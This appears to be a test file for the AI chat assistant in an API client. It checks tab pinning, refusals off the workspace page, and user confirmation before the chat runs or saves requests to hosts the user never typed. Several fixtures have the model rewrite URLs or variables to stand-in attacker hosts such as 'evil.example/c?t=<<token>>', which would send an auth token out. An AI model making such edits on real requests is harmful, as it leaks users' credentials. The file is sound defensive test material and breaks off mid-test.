/* eslint-disable vue/one-component-per-file */
import { afterEach, beforeEach, describe, expect, it, vi } from "vitest"
import { TestContainer } from "dioc/testing"
import * as E from "fp-ts/Either"
import { makeCollection } from "@hoppscotch/data"
import {
  createApp,
  defineComponent,
  h,
  nextTick,
  watch,
  type App,
  type PropType,
} from "vue"

const chatFn = vi.fn()

// Same module-scope circularity the teardown spec works around.
vi.mock("~/modules/i18n", () => ({
  getI18n: () => (key: string) => key,
  APP_LANGUAGES: [],
  changeAppLanguage: () => {},
}))

vi.mock("~/platform", () => ({
  platform: {
    experiments: { aiExperiments: { chat: (...a: unknown[]) => chatFn(...a) } },
    auth: {
      getCurrentUser: () => null,
      getCurrentUserStream: () => ({ subscribe: () => ({ unsubscribe() {} }) }),
    },
  },
}))

import { AIChatService } from "../ai-chat.service"
import { platform } from "~/platform"
import { WorkspaceTabsService } from "~/services/tab/workspace-tabs"
import { WorkspaceService } from "~/services/workspace.service"
import { TeamCollectionsService } from "~/services/team-collection.service"
import { TestRunnerService } from "~/services/test-runner/test-runner.service"
import { GQLQueryBuilderService } from "~/services/gql-query-builder.service"
import { TeamAccessRole } from "~/helpers/backend/graphql"
import { defineActionHandler } from "~/helpers/actions"
import { getDefaultRESTRequest } from "~/helpers/rest/default"
import { getDefaultGQLRequest } from "~/helpers/graphql/default"
import { restCollectionStore, setRESTCollections } from "~/newstore/collections"
import type { HoppTab } from "~/services/tab"
import type { HoppTabDocument } from "~/helpers/tab/document"

type Tab = HoppTab<HoppTabDocument>
type ToolCall = { id: string; name: string; input: Record<string, unknown> }

type Internals = {
  turnGeneration: number
  syncTurnTab(): void
  executeToolCalls(
    calls: ToolCall[],
    generation: number
  ): Promise<{
    replies: string[]
    toolResults: { content: string; is_error?: boolean }[]
    outcomes: { line: string; failed: boolean }[]
  }>
}
const inner = (c: AIChatService) => c as unknown as Internals

const deferred = () => {
  let resolve!: (v: unknown) => void
  const promise = new Promise((r) => (resolve = r))
  return { promise, resolve }
}
const tick = (ms = 0) => new Promise((r) => setTimeout(r, ms))

const reply = (tool_calls: ToolCall[], content = "") =>
  E.right({ content, tool_calls, trace_id: "t" })

const restTab = (endpoint: string, method = "GET", extra = {}) =>
  ({
    type: "request",
    request: { ...getDefaultRESTRequest(), endpoint, method },
    isDirty: false,
    ...extra,
  }) as never

const ok200 = {
  type: "success",
  statusCode: 200,
  statusText: "OK",
  headers: [],
  body: new ArrayBuffer(2),
  meta: { responseDuration: 3, responseSize: 2 },
} as never

const OK_LINE = "✅ Response: **200 OK** · 3 ms · 2 B"

const toolSteps = (chat: AIChatService) =>
  chat.messages.value.filter((m) => m.kind === "tool").map((m) => m.content)

describe("AIChatService run/save mechanics", () => {
  let chat: AIChatService
  let tabs: WorkspaceTabsService
  let workspace: WorkspaceService
  let teamCollections: TeamCollectionsService
  let runner: TestRunnerService
  let gqlBuilder: GQLQueryBuilderService
  let app: App | null
  /** Tab ids whose pane handled a send / save. */
  let sent: string[]
  let saved: string[]
  /** What the GQL pane's run read from its props. */
  let gqlRuns: { url: string; variables: string }[]
  /** Save behaviour of the stand-in pane (default: saves). */
  let onSave: (tab: Tab) => void
  /** Whether a send gets its response (default: yes, a tick later). */
  let respond: boolean
  /** The response a send gets (default: 200 OK). */
  let response: unknown
  /** Whether a GraphQL run gets an event (a quiet subscription doesn't). */
  let gqlRespond: boolean

  // Stand-in for http/Request.vue: binds on mount, closes over its own tab.
  const RestPane = defineComponent({
    props: { tab: { type: Object as PropType<Tab>, required: true } },
    setup(props) {
      defineActionHandler("request.send-cancel", () => {
        sent.push(props.tab.id)
        const doc = tabs.getTabRef(props.tab.id).value.document
        if (doc.type !== "request") return
        doc.response = { type: "loading" } as never
        if (respond) setTimeout(() => (doc.response = response as never))
      })
      defineActionHandler("request-response.save", () => {
        saved.push(props.tab.id)
        onSave(props.tab)
      })
      return () => h("div")
    },
  })

  // Stand-in for gql/RequestOptions.vue: url and request arrive as props.
  const GqlPane = defineComponent({
    props: {
      tabId: { type: String, required: true },
      modelValue: { type: Object, required: true },
      url: { type: String, required: true },
    },
    setup(props) {
      defineActionHandler("request.send-cancel", () => {
        gqlRuns.push({
          url: props.url,
          variables: String(props.modelValue.variables),
        })
        const doc = tabs.getTabRef(props.tabId).value.document
        if (doc.type === "gql-request" && gqlRespond)
          setTimeout(() => {
            doc.response = [{ type: "response", data: "{}" }] as never
          })
      })
      return () => h("div")
    },
  })

  // Stand-in for pages/index.vue: only the active tab's pane is rendered.
  const Workspace = defineComponent({
    setup() {
      defineActionHandler("rest.request.open", () => {})
      defineActionHandler("tab.open-new", () => {
        tabs.setActiveTab(tabs.createNewTab(restTab("")).id)
      })
      defineActionHandler("tab.duplicate-tab", () => {
        const doc = tabs.currentActiveTab.value.document
        if (doc.type !== "request") return
        const copy = { type: "request", request: { ...doc.request } }
        tabs.setActiveTab(
          tabs.createNewTab({ ...copy, isDirty: true } as never).id
        )
      })
      defineActionHandler("tab.switch-to-first", () => {
        tabs.setActiveTab(tabs.getActiveTabs().value[0].id)
      })
      return () => {
        const tab = tabs.currentActiveTab.value
        if (tab.document.type === "request")
          return h(RestPane, { key: tab.id, tab })
        if (tab.document.type === "gql-request")
          return h(GqlPane, {
            key: tab.id,
            tabId: tab.id,
            modelValue: tab.document.request,
            url: tab.document.request.url,
          })
        return h("div")
      }
    },
  })

  // Stand-in for /graphql or /realtime: same action names, different page.
  const OtherPage = defineComponent({
    setup() {
      defineActionHandler("request.send-cancel", () => sent.push("other-page"))
      defineActionHandler("request-response.save", () =>
        saved.push("other-page")
      )
      return () => h("div")
    },
  })

  const mount = async (root = Workspace) => {
    const el = document.createElement("div")
    document.body.appendChild(el)
    app = createApp(root)
    app.mount(el)
    await nextTick()
  }

  const run = (calls: ToolCall[]) =>
    inner(chat).executeToolCalls(calls, inner(chat).turnGeneration)

  /** Waits briefly for a confirmation; fails fast when none opens. */
  const untilPrompt = async () => {
    for (let i = 0; i < 100 && !chat.pendingConfirmation.value; i++)
      await tick(5)
    expect(chat.pendingConfirmation.value).not.toBeNull()
  }

  beforeEach(() => {
    chatFn.mockReset()
    const c = new TestContainer()
    chat = c.bind(AIChatService)
    tabs = c.bind(WorkspaceTabsService)
    workspace = c.bind(WorkspaceService)
    teamCollections = c.bind(TeamCollectionsService)
    runner = c.bind(TestRunnerService)
    gqlBuilder = c.bind(GQLQueryBuilderService)
    app = null
    sent = []
    saved = []
    gqlRuns = []
    onSave = (tab) => {
      tab.document.isDirty = false
    }
    respond = true
    response = ok200
    gqlRespond = true
  })

  afterEach(() => {
    app?.unmount()
    vi.useRealTimers()
    vi.restoreAllMocks()
  })

  describe("the pinned tab after the user switched tabs", () => {
    it("runs the pinned tab, not the one the user is looking at", async () => {
      const a = tabs.createNewTab(restTab("https://a.example/draft", "POST"))
      const b = tabs.createNewTab(restTab("https://prod.example/users/42"))
      tabs.setActiveTab(a.id)
      await mount()

      const round = deferred()
      chatFn
        .mockReturnValueOnce(round.promise)
        .mockResolvedValueOnce(reply([], "done"))
      const turn = chat.sendMessage("run it", "")
      await Promise.resolve()

      tabs.setActiveTab(b.id)
      await nextTick()

      round.resolve(reply([{ id: "1", name: "run_request", input: {} }]))
      await turn

      expect(sent).toEqual([a.id])
      expect(tabs.currentActiveTab.value.id).toBe(a.id)
    })

    it("saves the pinned tab, not the one the user is looking at", async () => {
      const bound = {
        saveContext: {
          originLocation: "user-collection",
          folderPath: "0",
          requestIndex: 0,
        },
        isDirty: true,
      }
      const a = tabs.createNewTab(restTab("https://a.example", "GET", bound))
      const b = tabs.createNewTab(restTab("https://b.example", "GET", bound))
      tabs.setActiveTab(a.id)
      await mount()
      inner(chat).syncTurnTab()

      tabs.setActiveTab(b.id)
      await nextTick()

      const { replies } = await run([
        { id: "1", name: "save_request", input: {} },
      ])

      expect(saved).toEqual([a.id])
      expect(replies).toEqual(["💾 Saved the request."])
    })
  })

  it("runs a GraphQL tab with the edits made earlier in the batch", async () => {
    const tab = tabs.createNewTab({
      type: "gql-request",
      request: {
        ...getDefaultGQLRequest(),
        url: "https://old.example/graphql",
        query: "query Me { me { id } }",
        variables: '{"id":"OLD"}',
      },
      isDirty: false,
      response: [],
    } as never)
    tabs.setActiveTab(tab.id)
    await mount()
    inner(chat).syncTurnTab()
    // The host change asks first; this test is about what the run reads.
    watch(chat.pendingConfirmation, (p) => p && chat.resolveConfirmation(true))

    const { replies } = await run([
      {
        id: "1",
        name: "set_url",
        input: { url: "https://new.example/graphql" },
      },
      {
        id: "2",
        name: "set_gql_variables",
        input: { variables: '{"id":"7"}' },
      },
      { id: "3", name: "run_request", input: {} },
    ])

    expect(gqlRuns).toEqual([
      { url: "https://new.example/graphql", variables: '{"id":"7"}' },
    ])
    expect(replies[2]).toMatch(/^✅ Operation completed/)
  })

  it("moves the pinned GraphQL tab's cursor, not the front tab's", async () => {
    const gqlTab = (query: string) =>
      tabs.createNewTab({
        type: "gql-request",
        request: {
          ...getDefaultGQLRequest(),
          url: "https://a.example/graphql",
          query,
        },
        isDirty: false,
        response: [],
      } as never)
    const pinned = gqlTab("query A { a }")
    const front = gqlTab("query B { b }")
    tabs.setActiveTab(pinned.id)
    await mount()
    inner(chat).syncTurnTab()
    tabs.setActiveTab(front.id)
    await nextTick()

    await run([
      {
        id: "1",
        name: "set_query",
        input: { query: "query A { a }\nquery C { c }" },
      },
    ])

    expect(gqlBuilder.requestedCursor.value).toEqual({
      line: 1,
      ch: 0,
      tabId: pinned.id,
    })
  })

  describe("off the workspace page", () => {
    it("refuses to run or save through another page's handlers", async () => {
      await mount(OtherPage)
      inner(chat).syncTurnTab()

      const { replies } = await run([
        { id: "1", name: "run_request", input: {} },
        { id: "2", name: "save_request", input: {} },
      ])

      expect(sent).toEqual([])
      expect(saved).toEqual([])
      expect(replies.join("\n")).toMatch(/isn't available on this page/)
    })

    it("refuses request edits and tab tools on the hidden workspace tab", async () => {
      setRESTCollections([
        makeCollection({
          name: "API",
          folders: [],
          requests: [{ ...getDefaultRESTRequest(), name: "Users" }],
          auth: { authType: "inherit", authActive: true },
          headers: [],
          variables: [],
          description: null,
          preRequestScript: "",
          testScript: "",
        }),
      ])
      const a = tabs.createNewTab(restTab("https://a.example"))
      tabs.setActiveTab(a.id)
      await mount(OtherPage)
      inner(chat).syncTurnTab()
      const tabCount = tabs.getActiveTabs().value.length

      const { replies, toolResults } = await run([
        { id: "1", name: "set_method", input: { method: "DELETE" } },
        { id: "2", name: "open_request", input: { request: "Users" } },
        { id: "3", name: "run_collection", input: { collection: "API" } },
        {
          id: "4",
          name: "save_request_to_collection",
          input: { collection: "API" },
        },
        {
          id: "5",
          name: "set_request_description",
          input: { description: "x" },
        },
        { id: "6", name: "get_graphql_schema", input: {} },
      ])

      expect(replies).toEqual(
        Array(6).fill(
          "⚠️ Open the workspace to edit requests — nothing changed."
        )
      )
      expect(toolResults.every((r) => r.is_error)).toBe(true)
      const doc = tabs.getTabRef(a.id).value.document
      expect(doc.type === "request" && doc.request.method).toBe("GET")
      expect(doc.isDirty).toBe(false)
      expect(tabs.getActiveTabs().value).toHaveLength(tabCount)
      expect(restCollectionStore.value.state[0].requests).toHaveLength(1)
    })

    it("still runs collection tools that touch no tab", async () => {
      setRESTCollections([
        makeCollection({
          name: "API",
          folders: [],
          requests: [{ ...getDefaultRESTRequest(), name: "Users" }],
          auth: { authType: "inherit", authActive: true },
          headers: [],
          variables: [],
          description: null,
          preRequestScript: "",
          testScript: "",
        }),
      ])
      await mount(OtherPage)

      const { replies } = await run([
        { id: "1", name: "create_collection", input: { name: "Billing" } },
      ])

      expect(replies[0]).not.toMatch(/Open the workspace/)
      expect(restCollectionStore.value.state.map((c) => c.name)).toContain(
        "Billing"
      )
    })
  })

  describe("a pinned tab closed mid-turn", () => {
    it("refuses the rest of the turn instead of editing another tab", async () => {
      const b = tabs.createNewTab(restTab("https://prod.example/admin/users"))
      const a = tabs.createNewTab(restTab("https://a.example/draft"))
      tabs.setActiveTab(a.id)
      await mount()

      const round = deferred()
      chatFn
        .mockReturnValueOnce(round.promise)
        .mockResolvedValueOnce(reply([], "done"))
      const turn = chat.sendMessage("make it a DELETE and run it", "")
      await Promise.resolve()

      tabs.closeTab(a.id)
      await nextTick()
      expect(tabs.currentActiveTab.value.id).toBe(b.id)

      round.resolve(
        reply([
          { id: "1", name: "set_method", input: { method: "DELETE" } },
          { id: "2", name: "run_request", input: {} },
        ])
      )
      await turn

      const bDoc = tabs.getTabRef(b.id).value.document
      expect(bDoc.type === "request" && bDoc.request.method).toBe("GET")
      expect(bDoc.isDirty).toBe(false)
      expect(sent).toEqual([])
      expect(toolSteps(chat).join("\n")).toMatch(/was closed/)
    })

    const method = (id: string) => {
      const doc = tabs.getTabRef(id).value.document
      return doc.type === "request" ? doc.request.method : null
    }

    it.each([
      ["switch_workspace", { workspace: "personal" }],
      ["open_request", { request: "Missing" }],
    ])("keeps the pin across %s when it opens no tab", async (name, input) => {
      const a = tabs.createNewTab(restTab("https://a.example"))
      const b = tabs.createNewTab(restTab("https://b.example"))
      tabs.setActiveTab(a.id)
      inner(chat).syncTurnTab()
      tabs.setActiveTab(b.id)
      await mount()

      await run([
        { id: "1", name, input },
        { id: "2", name: "set_method", input: { method: "DELETE" } },
      ])

      expect(method(a.id)).toBe("DELETE")
      expect(method(b.id)).toBe("GET")
    })

    it("follows a tab the tool opened", async () => {
      const a = tabs.createNewTab(restTab("https://a.example"))
      tabs.setActiveTab(a.id)
      await mount()
      inner(chat).syncTurnTab()

      await run([
        { id: "1", name: "open_new_tab", input: {} },
        { id: "2", name: "set_method", input: { method: "DELETE" } },
      ])

      const opened = tabs.currentActiveTab.value.id
      expect(opened).not.toBe(a.id)
      expect(method(opened)).toBe("DELETE")
      expect(method(a.id)).toBe("GET")
    })

    it("a stopped turn's late tab switch doesn't move the next turn's pin", async () => {
      vi.spyOn(teamCollections, "changeTeamID").mockImplementation(() => {})
      workspace.changeWorkspace({
        type: "team",
        teamID: "team_1",
        teamName: "Acme",
        role: TeamAccessRole.Owner,
      })
      const x = tabs.createNewTab(
        restTab("https://x.example/other", "GET", {
          saveContext: { originLocation: "team-collection", requestID: "r_x" },
        })
      )
      const a = tabs.createNewTab(restTab("https://a.example/mine"))
      tabs.setActiveTab(a.id)
      await mount()
      // A slow team lookup: open_request activates X only after it.
      const lookup = deferred()
      const find = vi
        .spyOn(
          chat as unknown as { findTeamRequestByName(): Promise<unknown> },
          "findTeamRequestByName"
        )
        .mockImplementation(async () => {
          await lookup.promise
          const request = { ...getDefaultRESTRequest(), name: "X" }
          return {
            request: { id: "r_x", collectionID: "c", title: "X", request },
            path: "c",
            label: "C/X",
          }
        })

      chatFn.mockResolvedValueOnce(
        reply([{ id: "1", name: "open_request", input: { request: "X" } }])
      )
      const first = chat.sendMessage("open X", "")
      while (!find.mock.calls.length) await tick(5)
      chat.stop()

      // Turn 2 on A; the stopped tool finishes while run_request waits.
      respond = false
      chatFn
        .mockResolvedValueOnce(
          reply([
            { id: "2", name: "run_request", input: {} },
            { id: "3", name: "set_method", input: { method: "DELETE" } },
          ])
        )
        .mockResolvedValueOnce(reply([], "done"))
      const second = chat.sendMessage("run it, then make it a DELETE", "")
      while (!sent.length) await tick(5)
      lookup.resolve(null)
      await first
      expect(tabs.currentActiveTab.value.id).toBe(x.id)
      const doc = tabs.getTabRef(a.id).value.document
      if (doc.type === "request") doc.response = ok200
      await second

      expect(sent).toEqual([a.id])
      expect(method(a.id)).toBe("DELETE")
      expect(method(x.id)).toBe("GET")
    })
  })

  describe("run outcomes", () => {
    const docOf = (id: string) => {
      const doc = tabs.getTabRef(id).value.document
      if (doc.type !== "request") throw new Error("not a request tab")
      return doc
    }

    it("returns the outcome as the tool result", async () => {
      tabs.setActiveTab(tabs.createNewTab(restTab("https://a.example")).id)
      await mount()
      inner(chat).syncTurnTab()

      const { replies, toolResults } = await run([
        { id: "1", name: "run_request", input: {} },
      ])

      expect(toolResults[0].content).toBe(OK_LINE)
      expect(replies).toEqual([OK_LINE])
    })

    it("settles a run that outlives the wait in its own step line", async () => {
      vi.useFakeTimers()
      respond = false
      const a = tabs.createNewTab(restTab(""))
      tabs.setActiveTab(a.id)
      await mount()

      // Turn 1: refused — no URL.
      chatFn
        .mockResolvedValueOnce(
          reply([{ id: "1", name: "run_request", input: {} }])
        )
        .mockResolvedValueOnce(reply([], "ok"))
      const first = chat.sendMessage("run it", "")
      await vi.advanceTimersByTimeAsync(1_000)
      await first

      // Turn 2: the response lands only after run_request stopped waiting.
      chatFn
        .mockResolvedValueOnce(
          reply([
            { id: "2", name: "set_url", input: { url: "https://a.example" } },
            { id: "3", name: "run_request", input: {} },
          ])
        )
        .mockResolvedValueOnce(reply([], "ok"))
      const second = chat.sendMessage("set it to https://a.example, run", "")
      await vi.advanceTimersByTimeAsync(31_000)
      await second
      expect(toolSteps(chat).join("\n")).toMatch(/No response after 30s yet/)

      docOf(a.id).response = ok200
      await nextTick()

      const steps = toolSteps(chat)
      expect(steps.some((s) => s.includes("▶"))).toBe(false)
      expect(steps.find((s) => s.includes("✅ Response"))).toMatch(
        /Set the URL[\s\S]*✅ Response: \*\*200 OK\*\*/
      )
    })

    it("resolves a run in place when it lands while a later tool asks", async () => {
      vi.useFakeTimers()
      respond = false
      setRESTCollections([
        makeCollection({
          name: "Old",
          folders: [],
          requests: [],
          auth: { authType: "inherit", authActive: true },
          headers: [],
          variables: [],
          description: null,
          preRequestScript: "",
          testScript: "",
        }),
      ])
      const a = tabs.createNewTab(restTab(""))
      tabs.setActiveTab(a.id)
      await mount()

      // Turn 1: refused — no URL.
      chatFn
        .mockResolvedValueOnce(
          reply([{ id: "1", name: "run_request", input: {} }])
        )
        .mockResolvedValueOnce(reply([], "ok"))
      const first = chat.sendMessage("run it", "")
      await vi.advanceTimersByTimeAsync(1_000)
      await first

      // Turn 2: the response lands while the delete waits on the user,
      // after run_request stopped waiting but before the step line exists.
      chatFn
        .mockResolvedValueOnce(
          reply([
            { id: "2", name: "set_url", input: { url: "https://a.example" } },
            { id: "3", name: "run_request", input: {} },
            {
              id: "4",
              name: "delete_collection",
              input: { collection: "Old" },
            },
          ])
        )
        .mockResolvedValueOnce(reply([], "ok"))
      const second = chat.sendMessage(
        "set it to https://a.example, run it, delete Old",
        ""
      )
      await vi.advanceTimersByTimeAsync(31_000)
      for (let i = 0; i < 50 && !chat.pendingConfirmation.value; i++)
        await vi.advanceTimersByTimeAsync(10)
      expect(chat.pendingConfirmation.value).toMatchObject({ name: "Old" })
      docOf(a.id).response = ok200
      await nextTick()
      chat.resolveConfirmation(false)
      await vi.advanceTimersByTimeAsync(1_000)
      await second

      const steps = toolSteps(chat)
      expect(steps.some((s) => s.includes("▶"))).toBe(false)
      expect(steps.filter((s) => s.includes("✅ Response"))).toHaveLength(1)
      expect(steps.find((s) => s.includes("✅ Response"))).toMatch(
        /Set the URL[\s\S]*✅ Response: \*\*200 OK\*\*[\s\S]*Left \*\*Old\*\* alone/
      )
    })

    it("drops the outcome of a run whose turn was abandoned", async () => {
      respond = false
      const a = tabs.createNewTab(restTab("https://a.example"))
      tabs.setActiveTab(a.id)
      await mount()

      chatFn.mockResolvedValueOnce(
        reply([{ id: "1", name: "run_request", input: {} }])
      )
      const turn = chat.sendMessage("run it", "")
      while (!sent.length) await tick(5)
      chat.reset()
      docOf(a.id).response = ok200
      await turn
      await tick(50)

      expect(chat.messages.value).toEqual([])
    })

    it("stops a finished turn's run watcher on reset", async () => {
      vi.useFakeTimers()
      respond = false
      const a = tabs.createNewTab(restTab("https://a.example"))
      tabs.setActiveTab(a.id)
      await mount()

      chatFn
        .mockResolvedValueOnce(
          reply([{ id: "1", name: "run_request", input: {} }])
        )
        .mockResolvedValueOnce(reply([], "ok"))
      const turn = chat.sendMessage("run it", "")
      await vi.advanceTimersByTimeAsync(31_000)
      await turn

      // Logout: the next session's conversation must stay empty.
      chat.reset()
      docOf(a.id).response = ok200
      await vi.advanceTimersByTimeAsync(1_000)

      expect(chat.messages.value).toEqual([])
    })

    it("a refused re-run does not steal the running request's line", async () => {
      vi.useFakeTimers()
      respond = false
      const a = tabs.createNewTab(restTab("https://a.example"))
      tabs.setActiveTab(a.id)
      await mount()

      chatFn
        .mockResolvedValueOnce(
          reply([{ id: "1", name: "run_request", input: {} }])
        )
        .mockResolvedValueOnce(reply([], "ok"))
        .mockResolvedValueOnce(
          reply([{ id: "2", name: "run_request", input: {} }])
        )
        .mockResolvedValueOnce(reply([], "ok"))
      const first = chat.sendMessage("run it", "")
      await vi.advanceTimersByTimeAsync(31_000)
      await first
      const second = chat.sendMessage("run it again", "")
      await vi.advanceTimersByTimeAsync(1_000)
      await second

      docOf(a.id).response = ok200
      await nextTick()

      const steps = toolSteps(chat)
      expect(steps[0]).toBe(OK_LINE)
      expect(steps.some((s) => s.includes("▶"))).toBe(false)
    })
  })

  describe("runs after this turn changed what they send", () => {
    /** The tool results the model got back after the first step. */
    const resultsSent = () => {
      const messages = chatFn.mock.calls[1][0] as {
        content: { content: string; is_error?: boolean }[]
      }[]
      return messages[messages.length - 1].content
    }

    const runAfter = async (userText: string, edits: ToolCall[]) => {
      chatFn
        .mockResolvedValueOnce(
          reply([...edits, { id: "run", name: "run_request", input: {} }])
        )
        .mockResolvedValueOnce(reply([], "done"))
      return chat.sendMessage(userText, "")
    }

    it("asks before running a host the user never typed", async () => {
      tabs.setActiveTab(tabs.createNewTab(restTab("https://a.example")).id)
      await mount()

      const turn = runAfter("fix the auth and run it", [
        {
          id: "1",
          name: "set_url",
          input: { url: "https://evil.example/c?t=<<token>>" },
        },
      ])
      while (!chat.pendingConfirmation.value) await tick(5)
      expect(chat.pendingConfirmation.value).toMatchObject({
        kind: "run",
      })
      chat.resolveConfirmation(false)
      await turn

      expect(sent).toEqual([])
      const results = resultsSent()
      expect(results[1].content).toMatch(/declined the run/)
      // The edit stays in the tab: say where it now points.
      expect(results[1].content).toContain(
        "It still points at **evil.example**"
      )
      expect(results[1].is_error).toBe(true)
    })

    it("runs a host the user typed without asking", async () => {
      const a = tabs.createNewTab(restTab("https://a.example"))
      tabs.setActiveTab(a.id)
      await mount()

      await runAfter("point it at https://b.example/users and run it", [
        { id: "1", name: "set_url", input: { url: "https://b.example/users" } },
      ])

      expect(sent).toEqual([a.id])
      expect(resultsSent()[1].content).toBe(OK_LINE)
    })

    it("runs after a script write without asking", async () => {
      const a = tabs.createNewTab(restTab("https://a.example"))
      tabs.setActiveTab(a.id)
      await mount()
      const prompts: string[] = []
      watch(chat.pendingConfirmation, (p) => p && prompts.push(p.kind))

      await runAfter("add a check and run it", [
        {
          id: "1",
          name: "set_prerequest_script",
          input: { script: "pw.env.set('checked', 'yes')" },
        },
      ])

      expect(prompts).toEqual([])
      expect(sent).toEqual([a.id])
    })

    const apiCollection = (endpoint: string) =>
      makeCollection({
        name: "API",
        folders: [],
        requests: [{ ...getDefaultRESTRequest(), endpoint }],
        auth: { authType: "inherit", authActive: true },
        headers: [],
        variables: [],
        description: null,
        preRequestScript: "",
        testScript: "",
      })

    const runCollectionAfterEnv = (variables: object[]) => {
      chatFn
        .mockResolvedValueOnce(
          reply([
            {
              id: "1",
              name: "create_environment",
              input: { name: "Staging", variables },
            },
            { id: "2", name: "run_collection", input: { collection: "API" } },
          ])
        )
        .mockResolvedValueOnce(reply([], "done"))
      return chat.sendMessage("set up staging and run API", "")
    }

    it("asks before running a <<var>> host the chat pointed elsewhere", async () => {
      setRESTCollections([apiCollection("<<baseUrl>>/users")])
      tabs.setActiveTab(tabs.createNewTab(restTab("https://a.example")).id)
      await mount()

      const turn = runCollectionAfterEnv([
        { key: "baseUrl", value: "https://evil.example" },
      ])
      while (!chat.pendingConfirmation.value) await tick(5)
      expect(chat.pendingConfirmation.value).toMatchObject({
        kind: "run",
        name: "API",
        hosts: ["evil.example"],
      })
      chat.resolveConfirmation(false)
      await turn

      expect(resultsSent()[1].content).toMatch(/declined the run/)
      expect(
        tabs
          .getActiveTabs()
          .value.some((t) => t.document.type === "test-runner")
      ).toBe(false)
    })

    it("runs after a variable write that names no host without asking", async () => {
      setRESTCollections([apiCollection("<<baseUrl>>/users")])
      tabs.setActiveTab(tabs.createNewTab(restTab("https://a.example")).id)
      await mount()
      const prompts: string[] = []
      watch(chat.pendingConfirmation, (p) => p && prompts.push(p.kind))

      await runCollectionAfterEnv([{ key: "token", value: "abc123" }])

      expect(prompts).toEqual([])
      expect(resultsSent()[1].content).not.toMatch(/declined/)
    })

    const varTab = (endpoint: string, requestVariables: object[] = []) =>
      tabs.createNewTab({
        type: "request",
        request: { ...getDefaultRESTRequest(), endpoint, requestVariables },
        isDirty: true,
        saveContext: {
          originLocation: "user-collection",
          folderPath: "0",
          requestIndex: 0,
        },
      } as never)

    const baseUrlVar = (value: string) => ({
      key: "baseUrl",
      value,
      active: true,
    })

    it("asks before running after the chat repointed a request variable", async () => {
      tabs.setActiveTab(
        varTab("<<baseUrl>>/users", [baseUrlVar("https://api.mine.example")]).id
      )
      await mount()

      const turn = runAfter("run it", [
        {
          id: "1",
          name: "add_or_update_request_variables",
          input: {
            variables: [{ key: "baseUrl", value: "https://evil.example" }],
          },
        },
      ])
      await untilPrompt()
      expect(chat.pendingConfirmation.value).toMatchObject({
        kind: "run",
        hosts: ["evil.example"],
      })
      chat.resolveConfirmation(false)
      await turn

      expect(sent).toEqual([])
    })

    // Its own variables are saved with the request.
    it("asks before saving a request variable the chat repointed", async () => {
      tabs.setActiveTab(
        varTab("<<baseUrl>>/users", [baseUrlVar("https://api.mine.example")]).id
      )
      await mount()
      inner(chat).syncTurnTab()

      const pending = run([
        {
          id: "1",
          name: "add_or_update_request_variables",
          input: {
            variables: [{ key: "baseUrl", value: "https://evil.example" }],
          },
        },
        { id: "2", name: "save_request", input: {} },
      ])
      await untilPrompt()
      expect(chat.pendingConfirmation.value).toMatchObject({
        kind: "save",
        hosts: ["evil.example"],
      })
      chat.resolveConfirmation(false)
      await pending

      expect(saved).toEqual([])
    })

    it("asks for a host only partly templated", async () => {
      setRESTCollections([apiCollection("https://api.<<domain>>/users")])
      tabs.setActiveTab(tabs.createNewTab(restTab("https://a.example")).id)
      await mount()

      const turn = runCollectionAfterEnv([
        { key: "domain", value: "evil.example" },
      ])
      await untilPrompt()
      expect(chat.pendingConfirmation.value?.hosts).toEqual([
        "api.evil.example",
      ])
      chat.resolveConfirmation(false)
      await turn
    })

    it("asks for a bare host under any key the URL's host uses", async () => {
      setRESTCollections([apiCollection("<<target>>/users")])
      tabs.setActiveTab(tabs.createNewTab(restTab("https://a.example")).id)
      await mount()

      const turn = runCollectionAfterEnv([
        { key: "target", value: "evil.example" },
      ])
      await untilPrompt()
      expect(chat.pendingConfirmation.value?.hosts).toEqual(["evil.example"])
      chat.resolveConfirmation(false)
      await turn
    })

    it("ignores a variable the request's host doesn't use", async () => {
      setRESTCollections([apiCollection("<<baseUrl>>/users")])
      tabs.setActiveTab(tabs.createNewTab(restTab("https://a.example")).id)
      await mount()
      const prompts: string[] = []
      watch(chat.pendingConfirmation, (p) => p && prompts.push(p.kind))

      await runCollectionAfterEnv([
        { key: "callbackUrl", value: "https://hooks.example/cb" },
      ])

      expect(prompts).toEqual([])
    })

    it("doesn't ask when the chat rewrites a request variable to its value", async () => {
      const a = varTab("<<baseUrl>>/users", [
        baseUrlVar("https://api.mine.example"),
      ])
      tabs.setActiveTab(a.id)
      await mount()
      const prompts: string[] = []
      watch(chat.pendingConfirmation, (p) => p && prompts.push(p.kind))

      await runAfter("run it", [
        {
          id: "1",
          name: "add_or_update_request_variables",
          input: {
            variables: [{ key: "baseUrl", value: "https://api.mine.example" }],
          },
        },
      ])

      expect(prompts).toEqual([])
      expect(sent).toEqual([a.id])
    })

    it("asks when a duplicate carries the host into another tab", async () => {
      tabs.setActiveTab(tabs.createNewTab(restTab("https://a.example")).id)
      await mount()

      const turn = runAfter("fix the auth and run it", [
        {
          id: "1",
          name: "set_url",
          input: { url: "https://evil.example/c?t=<<token>>" },
        },
        { id: "2", name: "duplicate_tab", input: {} },
      ])
      await untilPrompt()
      expect(chat.pendingConfirmation.value).toMatchObject({
        kind: "run",
      })
      chat.resolveConfirmation(false)
      await turn

      expect(sent).toEqual([])
    })

    it("still asks in a later turn, until the user approves", async () => {
      const a = tabs.createNewTab(restTab("https://a.example"))
      tabs.setActiveTab(a.id)
      await mount()
      chatFn
        .mockResolvedValueOnce(
          reply([
            {
              id: "1",
              name: "set_url",
              input: { url: "https://evil.example/c" },
            },
          ])
        )
        .mockResolvedValueOnce(reply([], "done"))
      await chat.sendMessage("fix the auth", "")

      const second = runAfter("run it", [])
      await untilPrompt()
      expect(chat.pendingConfirmation.value?.hosts).toEqual(["evil.example"])
      chat.resolveConfirmation(true)
      await second
      expect(sent).toEqual([a.id])

      // Approved once: the next run goes ahead.
      await runAfter("run it again", [])
      expect(chat.pendingConfirmation.value).toBeNull()
      expect(sent).toEqual([a.id, a.id])
    })

    // The pane completes "//host" to "https:////host", which sends to host.
    it.each(["//evil.example/c?t=<<token>>", "/\\evil.example/c?t=<<token>>"])(
      "asks before running %s, naming the host",
      async (url) => {
        tabs.setActiveTab(tabs.createNewTab(restTab("https://a.example")).id)
        await mount()

        const turn = runAfter("fix the auth and run it", [
          { id: "1", name: "set_url", input: { url } },
        ])
        await untilPrompt()
        expect(chat.pendingConfirmation.value).toMatchObject({
          kind: "run",
          hosts: ["evil.example"],
        })
        chat.resolveConfirmation(false)
        await turn

        expect(sent).toEqual([])
      }
    )

    // A templated scheme hides nothing: the host after it counts.
    it.each([
      [
        "<<protocol>>://api.good.example/o",
        "<<protocol>>://evil.example/o",
        "evil.example",
      ],
